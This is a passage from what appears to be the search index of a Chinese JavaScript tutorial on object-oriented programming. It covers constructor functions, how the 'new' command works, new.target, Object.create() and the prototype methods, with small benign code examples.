Programming\uff0c\u7f29\u5199\u4e3a OOP\uff09\u662f\u76ee\u524d\u4e3b\u6d41\u7684\u7f16\u7a0b\u8303\u5f0f\u3002\u5b83\u5c06\u771f\u5b9e\u4e16\u754c\u5404\u79cd\u590d\u6742\u7684\u5173\u7cfb\uff0c\u62bd\u8c61\u4e3a\u4e00\u4e2a\u4e2a\u5bf9\u8c61\uff0c\u7136\u540e\u7531\u5bf9\u8c61\u4e4b\u95f4\u7684\u5206\u5de5\u4e0e\u5408\u4f5c\uff0c\u5b8c\u6210\u5bf9\u771f\u5b9e\u4e16\u754c\u7684\u6a21\u62df\u3002 \u6bcf\u4e00\u4e2a\u5bf9\u8c61\u90fd\u662f\u529f\u80fd\u4e2d\u5fc3\uff0c\u5177\u6709\u660e\u786e\u5206\u5de5\uff0c\u53ef\u4ee5\u5b8c\u6210\u63a5\u53d7\u4fe1\u606f\u3001\u5904\u7406\u6570\u636e\u3001\u53d1\u51fa\u4fe1\u606f\u7b49\u4efb\u52a1\u3002\u5bf9\u8c61\u53ef\u4ee5\u590d\u7528\uff0c\u901a\u8fc7\u7ee7\u627f\u673a\u5236\u8fd8\u53ef\u4ee5\u5b9a\u5236\u3002\u56e0\u6b64\uff0c\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u5177\u6709\u7075\u6d3b\u3001\u4ee3\u7801\u53ef\u590d\u7528\u3001\u9ad8\u5ea6\u6a21\u5757\u5316\u7b49\u7279\u70b9\uff0c\u5bb9\u6613\u7ef4\u62a4\u548c\u5f00\u53d1\uff0c\u6bd4\u8d77\u7531\u4e00\u7cfb\u5217\u51fd\u6570\u6216\u6307\u4ee4\u7ec4\u6210\u7684\u4f20\u7edf\u7684\u8fc7\u7a0b\u5f0f\u7f16\u7a0b\uff08procedural programming\uff09\uff0c\u66f4\u9002\u5408\u591a\u4eba\u5408\u4f5c\u7684\u5927\u578b\u8f6f\u4ef6\u9879\u76ee\u3002 \u90a3\u4e48\uff0c\u201c\u5bf9\u8c61\u201d\uff08object\uff09\u5230\u5e95\u662f\u4ec0\u4e48\uff1f\u6211\u4eec\u4ece\u4e24\u4e2a\u5c42\u6b21\u6765\u7406\u89e3\u3002 \uff081\uff09\u5bf9\u8c61\u662f\u5355\u4e2a\u5b9e\u7269\u7684\u62bd\u8c61\u3002 \u4e00\u672c\u4e66\u3001\u4e00\u8f86\u6c7d\u8f66\u3001\u4e00\u4e2a\u4eba\u90fd\u53ef\u4ee5\u662f\u5bf9\u8c61\uff0c\u4e00\u4e2a\u6570\u636e\u5e93\u3001\u4e00\u5f20\u7f51\u9875\u3001\u4e00\u4e2a\u8fdc\u7a0b\u670d\u52a1\u5668\u8fde\u63a5\u4e5f\u53ef\u4ee5\u662f\u5bf9\u8c61\u3002\u5f53\u5b9e\u7269\u88ab\u62bd\u8c61\u6210\u5bf9\u8c61\uff0c\u5b9e\u7269\u4e4b\u95f4\u7684\u5173\u7cfb\u5c31\u53d8\u6210\u4e86\u5bf9\u8c61\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u4ece\u800c\u5c31\u53ef\u4ee5\u6a21\u62df\u73b0\u5b9e\u60c5\u51b5\uff0c\u9488\u5bf9\u5bf9\u8c61\u8fdb\u884c\u7f16\u7a0b\u3002 \uff082\uff09\u5bf9\u8c61\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u5c01\u88c5\u4e86\u5c5e\u6027\uff08property\uff09\u548c\u65b9\u6cd5\uff08method\uff09\u3002 \u5c5e\u6027\u662f\u5bf9\u8c61\u7684\u72b6\u6001\uff0c\u65b9\u6cd5\u662f\u5bf9\u8c61\u7684\u884c\u4e3a\uff08\u5b8c\u6210\u67d0\u79cd\u4efb\u52a1\uff09\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u52a8\u7269\u62bd\u8c61\u4e3a animal \u5bf9\u8c61\uff0c\u4f7f\u7528\u201c\u5c5e\u6027\u201d\u8bb0\u5f55\u5177\u4f53\u662f\u54ea\u4e00\u79cd\u52a8\u7269\uff0c\u4f7f\u7528\u201c\u65b9\u6cd5\u201d\u8868\u793a\u52a8\u7269\u7684\u67d0\u79cd\u884c\u4e3a\uff08\u5954\u8dd1\u3001\u6355\u730e\u3001\u4f11\u606f\u7b49\u7b49\uff09\u3002","title":"\u5bf9\u8c61\u662f\u4ec0\u4e48"},{"location":"oop/new/#_2","text":"\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u7b2c\u4e00\u6b65\uff0c\u5c31\u662f\u8981\u751f\u6210\u5bf9\u8c61\u3002\u524d\u9762\u8bf4\u8fc7\uff0c\u5bf9\u8c61\u662f\u5355\u4e2a\u5b9e\u7269\u7684\u62bd\u8c61\u3002\u901a\u5e38\u9700\u8981\u4e00\u4e2a\u6a21\u677f\uff0c\u8868\u793a\u67d0\u4e00\u7c7b\u5b9e\u7269\u7684\u5171\u540c\u7279\u5f81\uff0c\u7136\u540e\u5bf9\u8c61\u6839\u636e\u8fd9\u4e2a\u6a21\u677f\u751f\u6210\u3002 \u5178\u578b\u7684\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u8bed\u8a00\uff08\u6bd4\u5982 C++ \u548c Java\uff09\uff0c\u90fd\u6709\u201c\u7c7b\u201d\uff08class\uff09\u8fd9\u4e2a\u6982\u5ff5\u3002\u6240\u8c13\u201c\u7c7b\u201d\u5c31\u662f\u5bf9\u8c61\u7684\u6a21\u677f\uff0c\u5bf9\u8c61\u5c31\u662f\u201c\u7c7b\u201d\u7684\u5b9e\u4f8b\u3002\u4f46\u662f\uff0cJavaScript \u8bed\u8a00\u7684\u5bf9\u8c61\u4f53\u7cfb\uff0c\u4e0d\u662f\u57fa\u4e8e\u201c\u7c7b\u201d\u7684\uff0c\u800c\u662f\u57fa\u4e8e\u6784\u9020\u51fd\u6570\uff08constructor\uff09\u548c\u539f\u578b\u94fe\uff08prototype\uff09\u3002 JavaScript \u8bed\u8a00\u4f7f\u7528\u6784\u9020\u51fd\u6570\uff08constructor\uff09\u4f5c\u4e3a\u5bf9\u8c61\u7684\u6a21\u677f\u3002\u6240\u8c13\u201d\u6784\u9020\u51fd\u6570\u201d\uff0c\u5c31\u662f\u4e13\u95e8\u7528\u6765\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u7684\u51fd\u6570\u3002\u5b83\u5c31\u662f\u5bf9\u8c61\u7684\u6a21\u677f\uff0c\u63cf\u8ff0\u5b9e\u4f8b\u5bf9\u8c61\u7684\u57fa\u672c\u7ed3\u6784\u3002\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u751f\u6210\u591a\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8fd9\u4e9b\u5b9e\u4f8b\u5bf9\u8c61\u90fd\u6709\u76f8\u540c\u7684\u7ed3\u6784\u3002 \u6784\u9020\u51fd\u6570\u5c31\u662f\u4e00\u4e2a\u666e\u901a\u7684\u51fd\u6570\uff0c\u4f46\u5177\u6709\u81ea\u5df1\u7684\u7279\u5f81\u548c\u7528\u6cd5\u3002 1 2 3 var Vehicle = function () { this . price = 1000 ; }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Vehicle \u5c31\u662f\u6784\u9020\u51fd\u6570\u3002\u4e3a\u4e86\u4e0e\u666e\u901a\u51fd\u6570\u533a\u522b\uff0c\u6784\u9020\u51fd\u6570\u540d\u5b57\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u901a\u5e38\u5927\u5199\u3002 \u6784\u9020\u51fd\u6570\u7684\u7279\u70b9\u6709\u4e24\u4e2a\u3002 \u51fd\u6570\u4f53\u5185\u90e8\u4f7f\u7528\u4e86 this \u5173\u952e\u5b57\uff0c\u4ee3\u8868\u4e86\u6240\u8981\u751f\u6210\u7684\u5bf9\u8c61\u5b9e\u4f8b\u3002 \u751f\u6210\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u4f7f\u7528 new \u547d\u4ee4\u3002 \u4e0b\u9762\u5148\u4ecb\u7ecd new \u547d\u4ee4\u3002","title":"\u6784\u9020\u51fd\u6570"},{"location":"oop/new/#new_1","text":"","title":"new \u547d\u4ee4"},{"location":"oop/new/#_3","text":"new \u547d\u4ee4\u7684\u4f5c\u7528\uff0c\u5c31\u662f\u6267\u884c\u6784\u9020\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u3002 1 2 3 4 5 6 var Vehicle = function () { this . price = 1000 ; }; var v = new Vehicle (); v . price // 1000 \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7 new \u547d\u4ee4\uff0c\u8ba9\u6784\u9020\u51fd\u6570 Vehicle \u751f\u6210\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u4fdd\u5b58\u5728\u53d8\u91cf v \u4e2d\u3002\u8fd9\u4e2a\u65b0\u751f\u6210\u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u4ece\u6784\u9020\u51fd\u6570 Vehicle \u5f97\u5230\u4e86 price \u5c5e\u6027\u3002 new \u547d\u4ee4\u6267\u884c\u65f6\uff0c\u6784\u9020\u51fd\u6570\u5185\u90e8\u7684 this \uff0c\u5c31\u4ee3\u8868\u4e86\u65b0\u751f\u6210\u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c this.price \u8868\u793a\u5b9e\u4f8b\u5bf9\u8c61\u6709\u4e00\u4e2a price \u5c5e\u6027\uff0c\u503c\u662f1000\u3002 \u4f7f\u7528 new \u547d\u4ee4\u65f6\uff0c\u6839\u636e\u9700\u8981\uff0c\u6784\u9020\u51fd\u6570\u4e5f\u53ef\u4ee5\u63a5\u53d7\u53c2\u6570\u3002 1 2 3 4 5 var Vehicle = function ( p ) { this . price = p ; }; var v = new Vehicle ( 500 ); new \u547d\u4ee4\u672c\u8eab\u5c31\u53ef\u4ee5\u6267\u884c\u6784\u9020\u51fd\u6570\uff0c\u6240\u4ee5\u540e\u9762\u7684\u6784\u9020\u51fd\u6570\u53ef\u4ee5\u5e26\u62ec\u53f7\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u5e26\u62ec\u53f7\u3002\u4e0b\u9762\u4e24\u884c\u4ee3\u7801\u662f\u7b49\u4ef7\u7684\uff0c\u4f46\u662f\u4e3a\u4e86\u8868\u793a\u8fd9\u91cc\u662f\u51fd\u6570\u8c03\u7528\uff0c\u63a8\u8350\u4f7f\u7528\u62ec\u53f7\u3002 1 2 3 4 // \u63a8\u8350\u7684\u5199\u6cd5 var v = new Vehicle (); // \u4e0d\u63a8\u8350\u7684\u5199\u6cd5 var v = new Vehicle ; \u4e00\u4e2a\u5f88\u81ea\u7136\u7684\u95ee\u9898\u662f\uff0c\u5982\u679c\u5fd8\u4e86\u4f7f\u7528 new \u547d\u4ee4\uff0c\u76f4\u63a5\u8c03\u7528\u6784\u9020\u51fd\u6570\u4f1a\u53d1\u751f\u4ec0\u4e48\u4e8b\uff1f \u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6784\u9020\u51fd\u6570\u5c31\u53d8\u6210\u4e86\u666e\u901a\u51fd\u6570\uff0c\u5e76\u4e0d\u4f1a\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u3002\u800c\u4e14\u7531\u4e8e\u540e\u9762\u4f1a\u8bf4\u5230\u7684\u539f\u56e0\uff0c this \u8fd9\u65f6\u4ee3\u8868\u5168\u5c40\u5bf9\u8c61\uff0c\u5c06\u9020\u6210\u4e00\u4e9b\u610f\u60f3\u4e0d\u5230\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 7 var Vehicle = function (){ this . price = 1000 ; }; var v = Vehicle (); v // undefined price // 1000 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8c03\u7528 Vehicle \u6784\u9020\u51fd\u6570\u65f6\uff0c\u5fd8\u4e86\u52a0\u4e0a new \u547d\u4ee4\u3002\u7ed3\u679c\uff0c\u53d8\u91cf v \u53d8\u6210\u4e86 undefined \uff0c\u800c price \u5c5e\u6027\u53d8\u6210\u4e86\u5168\u5c40\u53d8\u91cf\u3002\u56e0\u6b64\uff0c\u5e94\u8be5\u975e\u5e38\u5c0f\u5fc3\uff0c\u907f\u514d\u4e0d\u4f7f\u7528 new \u547d\u4ee4\u3001\u76f4\u63a5\u8c03\u7528\u6784\u9020\u51fd\u6570\u3002 \u4e3a\u4e86\u4fdd\u8bc1\u6784\u9020\u51fd\u6570\u5fc5\u987b\u4e0e new \u547d\u4ee4\u4e00\u8d77\u4f7f\u7528\uff0c\u4e00\u4e2a\u89e3\u51b3\u529e\u6cd5\u662f\uff0c\u6784\u9020\u51fd\u6570\u5185\u90e8\u4f7f\u7528\u4e25\u683c\u6a21\u5f0f\uff0c\u5373\u7b2c\u4e00\u884c\u52a0\u4e0a use strict \u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u4e00\u65e6\u5fd8\u4e86\u4f7f\u7528 new \u547d\u4ee4\uff0c\u76f4\u63a5\u8c03\u7528\u6784\u9020\u51fd\u6570\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 function Fubar ( foo , bar ){ 'use strict' ; this . _foo = foo ; this . _bar = bar ; } Fubar () // TypeError: Cannot set property '_foo' of undefined \u4e0a\u9762\u4ee3\u7801\u7684 Fubar \u4e3a\u6784\u9020\u51fd\u6570\uff0c use strict \u547d\u4ee4\u4fdd\u8bc1\u4e86\u8be5\u51fd\u6570\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\u8fd0\u884c\u3002\u7531\u4e8e\u4e25\u683c\u6a21\u5f0f\u4e2d\uff0c\u51fd\u6570\u5185\u90e8\u7684 this \u4e0d\u80fd\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u9ed8\u8ba4\u7b49\u4e8e undefined \uff0c\u5bfc\u81f4\u4e0d\u52a0 new \u8c03\u7528\u4f1a\u62a5\u9519\uff08JavaScript \u4e0d\u5141\u8bb8\u5bf9 undefined \u6dfb\u52a0\u5c5e\u6027\uff09\u3002 \u53e6\u4e00\u4e2a\u89e3\u51b3\u529e\u6cd5\uff0c\u6784\u9020\u51fd\u6570\u5185\u90e8\u5224\u65ad\u662f\u5426\u4f7f\u7528 new \u547d\u4ee4\uff0c\u5982\u679c\u53d1\u73b0\u6ca1\u6709\u4f7f\u7528\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 function Fubar ( foo , bar ) { if ( ! ( this instanceof Fubar )) { return new Fubar ( foo , bar ); } this . _foo = foo ; this . _bar = bar ; } Fubar ( 1 , 2 ). _foo // 1 ( new Fubar ( 1 , 2 )). _foo // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\u7684\u6784\u9020\u51fd\u6570\uff0c\u4e0d\u7ba1\u52a0\u4e0d\u52a0 new \u547d\u4ee4\uff0c\u90fd\u4f1a\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\u3002","title":"\u57fa\u672c\u7528\u6cd5"},{"location":"oop/new/#new_2","text":"\u4f7f\u7528 new \u547d\u4ee4\u65f6\uff0c\u5b83\u540e\u9762\u7684\u51fd\u6570\u4f9d\u6b21\u6267\u884c\u4e0b\u9762\u7684\u6b65\u9aa4\u3002 \u521b\u5efa\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff0c\u4f5c\u4e3a\u5c06\u8981\u8fd4\u56de\u7684\u5bf9\u8c61\u5b9e\u4f8b\u3002 \u5c06\u8fd9\u4e2a\u7a7a\u5bf9\u8c61\u7684\u539f\u578b\uff0c\u6307\u5411\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\u3002 \u5c06\u8fd9\u4e2a\u7a7a\u5bf9\u8c61\u8d4b\u503c\u7ed9\u51fd\u6570\u5185\u90e8\u7684 this \u5173\u952e\u5b57\u3002 \u5f00\u59cb\u6267\u884c\u6784\u9020\u51fd\u6570\u5185\u90e8\u7684\u4ee3\u7801\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c\u6784\u9020\u51fd\u6570\u5185\u90e8\uff0c this \u6307\u7684\u662f\u4e00\u4e2a\u65b0\u751f\u6210\u7684\u7a7a\u5bf9\u8c61\uff0c\u6240\u6709\u9488\u5bf9 this \u7684\u64cd\u4f5c\uff0c\u90fd\u4f1a\u53d1\u751f\u5728\u8fd9\u4e2a\u7a7a\u5bf9\u8c61\u4e0a\u3002\u6784\u9020\u51fd\u6570\u4e4b\u6240\u4ee5\u53eb\u201c\u6784\u9020\u51fd\u6570\u201d\uff0c\u5c31\u662f\u8bf4\u8fd9\u4e2a\u51fd\u6570\u7684\u76ee\u7684\uff0c\u5c31\u662f\u64cd\u4f5c\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff08\u5373 this \u5bf9\u8c61\uff09\uff0c\u5c06\u5176\u201c\u6784\u9020\u201d\u4e3a\u9700\u8981\u7684\u6837\u5b50\u3002 \u5982\u679c\u6784\u9020\u51fd\u6570\u5185\u90e8\u6709 return \u8bed\u53e5\uff0c\u800c\u4e14 return \u540e\u9762\u8ddf\u7740\u4e00\u4e2a\u5bf9\u8c61\uff0c new \u547d\u4ee4\u4f1a\u8fd4\u56de return \u8bed\u53e5\u6307\u5b9a\u7684\u5bf9\u8c61\uff1b\u5426\u5219\uff0c\u5c31\u4f1a\u4e0d\u7ba1 return \u8bed\u53e5\uff0c\u8fd4\u56de this \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 var Vehicle = function () { this . price = 1000 ; return 1000 ; }; ( new Vehicle ()) === 1000 // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6784\u9020\u51fd\u6570 Vehicle \u7684 return \u8bed\u53e5\u8fd4\u56de\u4e00\u4e2a\u6570\u503c\u3002\u8fd9\u65f6\uff0c new \u547d\u4ee4\u5c31\u4f1a\u5ffd\u7565\u8fd9\u4e2a return \u8bed\u53e5\uff0c\u8fd4\u56de\u201c\u6784\u9020\u201d\u540e\u7684 this \u5bf9\u8c61\u3002 \u4f46\u662f\uff0c\u5982\u679c return \u8bed\u53e5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u8ddf this \u65e0\u5173\u7684\u65b0\u5bf9\u8c61\uff0c new \u547d\u4ee4\u4f1a\u8fd4\u56de\u8fd9\u4e2a\u65b0\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f this \u5bf9\u8c61\u3002\u8fd9\u4e00\u70b9\u9700\u8981\u7279\u522b\u5f15\u8d77\u6ce8\u610f\u3002 1 2 3 4 5 6 7 var Vehicle = function (){ this . price = 1000 ; return { price : 2000 }; }; ( new Vehicle ()). price // 2000 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6784\u9020\u51fd\u6570 Vehicle \u7684 return \u8bed\u53e5\uff0c\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u65b0\u5bf9\u8c61\u3002 new \u547d\u4ee4\u4f1a\u8fd4\u56de\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f this \u5bf9\u8c61\u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u5982\u679c\u5bf9\u666e\u901a\u51fd\u6570\uff08\u5185\u90e8\u6ca1\u6709 this \u5173\u952e\u5b57\u7684\u51fd\u6570\uff09\u4f7f\u7528 new \u547d\u4ee4\uff0c\u5219\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 function getMessage () { return 'this is a message' ; } var msg = new getMessage (); msg // {} typeof msg // \"object\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c getMessage \u662f\u4e00\u4e2a\u666e\u901a\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u5bf9\u5b83\u4f7f\u7528 new \u547d\u4ee4\uff0c\u4f1a\u5f97\u5230\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u3002\u8fd9\u662f\u56e0\u4e3a new \u547d\u4ee4\u603b\u662f\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8981\u4e48\u662f\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8981\u4e48\u662f return \u8bed\u53e5\u6307\u5b9a\u7684\u5bf9\u8c61\u3002\u672c\u4f8b\u4e2d\uff0c return \u8bed\u53e5\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5 new \u547d\u4ee4\u5c31\u5ffd\u7565\u4e86\u8be5\u8bed\u53e5\u3002 new \u547d\u4ee4\u7b80\u5316\u7684\u5185\u90e8\u6d41\u7a0b\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u8868\u793a\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function _new ( /* \u6784\u9020\u51fd\u6570 */ constructor , /* \u6784\u9020\u51fd\u6570\u53c2\u6570 */ params ) { // \u5c06 arguments \u5bf9\u8c61\u8f6c\u4e3a\u6570\u7ec4 var args = []. slice . call ( arguments ); // \u53d6\u51fa\u6784\u9020\u51fd\u6570 var constructor = args . shift (); // \u521b\u5efa\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff0c\u7ee7\u627f\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027 var context = Object . create ( constructor . prototype ); // \u6267\u884c\u6784\u9020\u51fd\u6570 var result = constructor . apply ( context , args ); // \u5982\u679c\u8fd4\u56de\u7ed3\u679c\u662f\u5bf9\u8c61\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\uff0c\u5426\u5219\u8fd4\u56de context \u5bf9\u8c61 return ( typeof result === 'object' && result != null ) ? result : context ; } // \u5b9e\u4f8b var actor = _new ( Person , '\u5f20\u4e09' , 28 );","title":"new \u547d\u4ee4\u7684\u539f\u7406"},{"location":"oop/new/#newtarget","text":"\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u4f7f\u7528 new.target \u5c5e\u6027\u3002\u5982\u679c\u5f53\u524d\u51fd\u6570\u662f new \u547d\u4ee4\u8c03\u7528\uff0c new.target \u6307\u5411\u5f53\u524d\u51fd\u6570\uff0c\u5426\u5219\u4e3a undefined \u3002 1 2 3 4 5 6 function f () { console . log ( new . target === f ); } f () // false new f () // true \u4f7f\u7528\u8fd9\u4e2a\u5c5e\u6027\uff0c\u53ef\u4ee5\u5224\u65ad\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019\uff0c\u662f\u5426\u4f7f\u7528 new \u547d\u4ee4\u3002 1 2 3 4 5 6 7 8 function f () { if ( ! new . target ) { throw new Error ( '\u8bf7\u4f7f\u7528 new \u547d\u4ee4\u8c03\u7528\uff01' ); } // ... } f () // Uncaught Error: \u8bf7\u4f7f\u7528 new \u547d\u4ee4\u8c03\u7528\uff01 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6784\u9020\u51fd\u6570 f \u8c03\u7528\u65f6\uff0c\u6ca1\u6709\u4f7f\u7528 new \u547d\u4ee4\uff0c\u5c31\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002","title":"new.target"},{"location":"oop/new/#objectcreate","text":"\u6784\u9020\u51fd\u6570\u4f5c\u4e3a\u6a21\u677f\uff0c\u53ef\u4ee5\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u3002\u4f46\u662f\uff0c\u6709\u65f6\u62ff\u4e0d\u5230\u6784\u9020\u51fd\u6570\uff0c\u53ea\u80fd\u62ff\u5230\u4e00\u4e2a\u73b0\u6709\u7684\u5bf9\u8c61\u3002\u6211\u4eec\u5e0c\u671b\u4ee5\u8fd9\u4e2a\u73b0\u6709\u7684\u5bf9\u8c61\u4f5c\u4e3a\u6a21\u677f\uff0c\u751f\u6210\u65b0\u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u4f7f\u7528 Object.create() \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var person1 = { name : '\u5f20\u4e09' , age : 38 , greeting : function () { console . log ( 'Hi! I\\'m ' + this . name + '.' ); } }; var person2 = Object . create ( person1 ); person2 . name // \u5f20\u4e09 person2 . greeting () // Hi! I'm \u5f20\u4e09. \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 person1 \u662f person2 \u7684\u6a21\u677f\uff0c\u540e\u8005\u7ee7\u627f\u4e86\u524d\u8005\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 Object.create() \u7684\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u8bf7\u770b\u540e\u9762\u7684\u76f8\u5173\u7ae0\u8282\u3002","title":"Object.create() \u521b\u5efa\u5b9e\u4f8b\u5bf9\u8c61"},{"location":"oop/object/","text":"Object \u5bf9\u8c61\u7684\u76f8\u5173\u65b9\u6cd5 \u00b6 JavaScript \u5728 Object \u5bf9\u8c61\u4e0a\u9762\uff0c\u63d0\u4f9b\u4e86\u5f88\u591a\u76f8\u5173\u65b9\u6cd5\uff0c\u5904\u7406\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u76f8\u5173\u64cd\u4f5c\u3002\u672c\u7ae0\u4ecb\u7ecd\u8fd9\u4e9b\u65b9\u6cd5\u3002 Object.getPrototypeOf() \u00b6 Object.getPrototypeOf \u65b9\u6cd5\u8fd4\u56de\u53c2\u6570\u5bf9\u8c61\u7684\u539f\u578b\u3002\u8fd9\u662f\u83b7\u53d6\u539f\u578b\u5bf9\u8c61\u7684\u6807\u51c6\u65b9\u6cd5\u3002 1 2 3 var F = function () {}; var f = new F (); Object . getPrototypeOf ( f ) === F . prototype // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5bf9\u8c61 f \u7684\u539f\u578b\u662f F.prototype \u3002 \u4e0b\u9762\u662f\u51e0\u79cd\u7279\u6b8a\u5bf9\u8c61\u7684\u539f\u578b\u3002 1 2 3 4 5 6 7 8 9 // \u7a7a\u5bf9\u8c61\u7684\u539f\u578b\u662f Object.prototype Object . getPrototypeOf ({}) === Object . prototype // true // Object.prototype \u7684\u539f\u578b\u662f null Object . getPrototypeOf ( Object . prototype ) === null // true // \u51fd\u6570\u7684\u539f\u578b\u662f Function.prototype function f () {} Object . getPrototypeOf ( f ) === Function . prototype // true Object.setPrototypeOf() \u00b6 Object.setPrototypeOf \u65b9\u6cd5\u4e3a\u53c2\u6570\u5bf9\u8c61\u8bbe\u7f6e\u539f\u578b\uff0c\u8fd4\u56de\u8be5\u53c2\u6570\u5bf9\u8c61\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u73b0\u6709\u5bf9\u8c61\uff0c\u7b2c\u4e8c\u4e2a\u662f\u539f\u578b\u5bf9\u8c61\u3002 1 2 3 4 5 6 var a = {}; var b = { x : 1 }; Object . setPrototypeOf ( a , b ); Object . getPrototypeOf ( a ) === b // true a . x // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.setPrototypeOf \u65b9\u6cd5\u5c06\u5bf9\u8c61 a \u7684\u539f\u578b\uff0c\u8bbe\u7f6e\u4e3a\u5bf9\u8c61 b \uff0c\u56e0\u6b64 a \u53ef\u4ee5\u5171\u4eab b \u7684\u5c5e\u6027\u3002 new \u547d\u4ee4\u53ef\u4ee5\u4f7f\u7528 Object.setPrototypeOf \u65b9\u6cd5\u6a21\u62df\u3002 1 2 3 4 5 6 7 8 var F = function () { this . foo = 'bar' ; }; var f = new F (); // \u7b49\u540c\u4e8e var f = Object . setPrototypeOf ({}, F . prototype ); F . call ( f ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c new \u547d\u4ee4\u65b0\u5efa\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u5176\u5b9e\u53ef\u4ee5\u5206\u6210\u4e24\u6b65\u3002\u7b2c\u4e00\u6b65\uff0c\u5c06\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u7684\u539f\u578b\u8bbe\u4e3a\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\uff08\u4e0a\u4f8b\u662f F.prototype \uff09\uff1b\u7b2c\u4e8c\u6b65\uff0c\u5c06\u6784\u9020\u51fd\u6570\u5185\u90e8\u7684 this \u7ed1\u5b9a\u8fd9\u4e2a\u7a7a\u5bf9\u8c61\uff0c\u7136\u540e\u6267\u884c\u6784\u9020\u51fd\u6570\uff0c\u4f7f\u5f97\u5b9a\u4e49\u5728 this \u4e0a\u9762\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\uff08\u4e0a\u4f8b\u662f this.foo \uff09\uff0c\u90fd\u8f6c\u79fb\u5230\u8fd9\u4e2a\u7a7a\u5bf9\u8c61\u4e0a\u3002 Object.create() \u00b6 \u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5e38\u7528\u65b9\u6cd5\u662f\uff0c\u4f7f\u7528 new 